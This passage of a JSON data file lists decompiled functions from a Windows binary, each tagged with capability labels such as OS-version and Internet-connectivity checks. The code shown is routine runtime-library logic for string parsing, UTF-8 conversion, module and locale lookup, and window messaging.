            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00406024(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.0040546c();\n            }\n            else {\n                fcn.00405490();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405c48();\n            }\n            else {\n                fcn.00405c60();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.0040600c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00406024();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fd8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00406f3c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x4a6008 != NULL) {\n                    (**0x4a6008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n            do {\n                fcn.00406864();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "0040611c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040611c(void)\n\n{\n    if (*0x4a1018 != NULL) {\n        (**0x4a1018)();\n        return;\n    }\n    fcn.00403040();\n    return;\n}\n",
        "token_count": 51
    },
    "00406484": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406568)\n// WARNING: Removing unreachable block (ram,0x00406657)\n// WARNING: Removing unreachable block (ram,0x0040665e)\n// WARNING: Removing unreachable block (ram,0x004065e4)\n// WARNING: Removing unreachable block (ram,0x004065fa)\n// WARNING: Removing unreachable block (ram,0x00406668)\n// WARNING: Removing unreachable block (ram,0x0040666b)\n// WARNING: Removing unreachable block (ram,0x00406671)\n// WARNING: Removing unreachable block (ram,0x004065f0)\n\nulong __fastcall fcn.00406484(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    int32_t *piStack36;\n    uint32_t uStack28;\n    int32_t iStack24;\n    \n    iVar7 = 1;\n    uStack28 = 0;\n    iStack24 = 0;\n    if (in_EAX == 0) {\n        *param_2 = 1;\n        goto code_r0x0040668c;\n    }\n    for (; *(in_EAX + -1 + iVar7) == ' '; iVar7 = iVar7 + 1) {\n    }\n    bVar9 = false;\n    cVar4 = *(in_EAX + -1 + iVar7);\n    if (cVar4 == '-') {\n        bVar9 = true;\n        iVar7 = iVar7 + 1;\n    }\n    else if (cVar4 == '+') {\n        iVar7 = iVar7 + 1;\n    }\n    uVar2 = 1;\n    piStack36 = param_2;\n    if (((*(in_EAX + -1 + iVar7) == '$') || (cVar4 = fcn.004033ec(),  cVar4 == 'X')) ||\n       ((*(in_EAX + -1 + iVar7) == '0' && (cVar4 = fcn.004033ec(),  cVar4 == 'X')))) {\n        if (*(in_EAX + -1 + iVar7) == '0') {\n            iVar7 = iVar7 + 1;\n        }\n        do {\n            iVar7 = iVar7 + 1;\n            uVar1 = *(in_EAX + -1 + iVar7);\n            if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n            }\n            else if (uVar1 + 0xbf < 6) {\n                uVar8 = uVar1 - 0x37;\n            }\n            else {\n                if (5 < uVar1 + 0x9f) goto code_r0x0040659a;\n                uVar8 = uVar1 - 0x57;\n            }\n            if (((iStack24 != 0) && (iStack24 < 0)) || ((iStack24 != 0xfffffff && (0xfffffff < iStack24))))\n            goto code_r0x0040659a;\n            uVar3 = uStack28 >> 0x1c;\n            uVar5 = uStack28 * 0x10;\n            uStack28 = uVar5 + uVar8;\n            iStack24 = (iStack24 << 4 | uVar3) + (uVar8 >> 0x1f) + CARRY4(uVar5, uVar8);\n            uVar2 = 0;\n        } while( true );\n    }\n    for (; *(in_EAX + -1 + iVar7) - 0x30U < 10; iVar7 = iVar7 + 1) {\n        uVar2 = *(in_EAX + -1 + iVar7);\n        iVar6 = fcn.004063cc();\n        piStack36 = (uVar2 - 0x30) + iVar6;\n        uVar2 = 0;\n    }\n    iStack24 = 0;\n    uStack28 = 0;\n    goto code_r0x00406672;\ncode_r0x0040659a:\n    if (bVar9) {\n        bVar9 = uStack28 != 0;\n        uStack28 = -uStack28;\n        iStack24 = -(iStack24 + bVar9);\n    }\ncode_r0x00406672:\n    if (uVar2 | *(in_EAX + -1 + iVar7) != '\\0') {\n        *piStack36 = iVar7;\n    }\n    else {\n        *piStack36 = 0;\n    }\ncode_r0x0040668c:\n    return CONCAT44(iStack24, uStack28);\n}\n",
        "token_count": 1083
    },
    "004068f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004068f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00406b5c();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 154
    },
    "00406998": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00406998(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    int32_t hFindFile;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    hFindFile = sub.kernel32.dll_GetModuleHandleA(0x406b38);\n    if (((hFindFile == 0) || (pcVar1 = sub.kernel32.dll_GetProcAddress(hFindFile, 0x406b48),  pcVar1 == NULL)) ||\n       (iVar2 = (*pcVar1)(lpString1, &lpFileName, 0x105),  iVar2 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406978();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406978();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar2 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar2 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.00406978();\n            if (0x105 < pcVar4 + (iVar2 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2, pcVar3, pcVar4 + (1 - pcVar3));\n            hFindFile = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (hFindFile == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(hFindFile);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar2 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar2) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2 + 1, &lpString2, 0x104 - iVar2);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar2 = iVar2 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 854
    },
    "00406b5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406b5c(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00406b5c::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.00406b5c::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x406d8c;\n    uVar5 = 0x80000001;\n    noname_12 = 0x406b9b;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00406b5c::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x406d8c;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x406bb9;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00406b5c::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x406da8;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00406b5c::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00406b5c::lpLibFileName);\n                    for (puVar3 = &fcn.00406b5c::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.00406b5c::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.00406b5c::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406b5c::var_12h, 0x105 - (pcVar4 - &fcn.00406b5c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406b5c::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406b5c::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.00406b5c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406b5c::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.00406b5c::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.00406b5c::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406b5c::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00406998(noname_0, 0x406c61, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00406b5c::lpLibFileName, 0, 0, &fcn.00406b5c::var_12h, &fcn.00406b5c::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x406dc8, 0, 0, &fcn.00406b5c::var_12h, &fcn.00406b5c::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x406c68);\n    return iVar1;\n}\n",
        "token_count": 1614
    },
    "00406e60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406e60(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x4a103c;\n    if (*0x4a103c != NULL) {\n        do {\n            uStack32 = 0x406e9b;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "004070b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004070b0(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 654
    },
    "0040718c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040718c(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 848
    },
    "004084d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004084d4(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x408584, 0x408570);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x40858c);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x40859c);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4085b4);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 339
    },
    "004085cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004085cc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x408607;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4a8800 = *0x4a8800 + 1;\n    if ((*0x4a8800 == 0) && (*0x4a8804 != 0)) {\n        iStack20 = *0x4a8804;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 178
    },
    "0040f66c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040f66c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar3 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != *(in_EAX + 0x24)) {\n        fcn.0040f628();\n        iStack20 = *(in_EAX + 0x28);\n        fcn.0040f4a0();\n        bVar4 = *(iStack24 + 0xc) != 0;\n        if (bVar4) {\n            fcn.0040f404();\n        }\n        while( true ) {\n            iVar2 = fcn.0040f424();\n            if (iVar2 == 0xffff) break;\n            iVar2 = fcn.0040f424();\n            if (iVar2 != 0) {\n                fcn.0040f65c();\n            }\n        }\n        fcn.0040f628();\n        if (bVar4) {\n            fcn.0040f410();\n        }\n        *(in_EAX + 0x24) = iVar1;\n        iVar1 = fcn.0040f404();\n        uVar3 = unaff_EBX & 0xffffff00 | iVar1 + -1 == iStack20;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 385
    },
    "00409dd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00409dd8(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00403eb4();\n    if (iStack20 != 0) {\n        fcn.004096b4();\n    }\n    return uVar1;\n}\n",
        "token_count": 69
    },
    "00409e14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409e14(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00403eb4();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00409e2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409e2c(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403eb4();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 85
    },
    "00409e4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409e4c(int32_t param_1, uint32_t *param_2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00406484();\n    *param_2 = uVar1;\n    param_2[1] = uVar1 >> 0x20;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 99
    },
    "0040a764": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a764(void)\n\n{\n    ushort uVar1;\n    char *in_EAX;\n    ushort *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    if (*in_EAX == '\\0') {\n        return 0;\n    }\n    puVar2 = in_EAX + 1 & 0xfffffffe;\n    while( true ) {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            uVar3 = uVar1;\n            uVar4 = uVar1 >> 8;\n        } while ((uVar3 & uVar4) != 0);\n        if (uVar3 == 0) break;\n        if (uVar4 == 0) {\n            return -in_EAX + -1 + puVar2;\n        }\n    }\n    return -in_EAX + -2 + puVar2;\n}\n",
        "token_count": 210
    },
    "0040aa6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
